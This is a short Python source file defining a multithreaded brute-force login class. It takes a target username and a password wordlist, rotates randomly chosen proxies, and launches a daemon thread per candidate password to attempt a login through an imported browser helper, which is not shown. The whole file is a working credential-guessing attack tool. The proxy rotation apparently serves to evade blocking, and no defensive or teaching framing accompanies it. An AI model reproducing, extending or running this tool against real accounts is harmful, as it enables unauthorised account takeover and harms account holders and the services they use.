from threading import Thread
from lib.src.browser import Browser
from lib.src.const import session_data
from lib.src.password_manager import Pw
from lib.src.proxy_manager import Px
from lib.src.debug.debug import Debug
from time import sleep
from random import choice

class Brute:
	def __init__(self, username, wordlist, timeout = None, proxy = None):
		self._username = username
		self._password = wordlist
		self._timeout = timeout
		self._proxy = proxy
	def attack(self, key):
		passwordL = Pw(self._password).password()[key].replace('\n', '')
		if self._proxy:
			proxyL = choice(Px(self._proxy).proxy()).replace('\n', '')
			Browser(username=self._username, password=passwordL, proxy=proxyL).login()

		else:
			Browser(username=self._username, password=passwordL).login()
	def start(self):
		Debug('[*] Starting...')
		for i in range(len(Pw(self._password).read())):
			sleep(self._timeout)
			Thread(target=self.attack, args=(i,), daemon=True).start()
		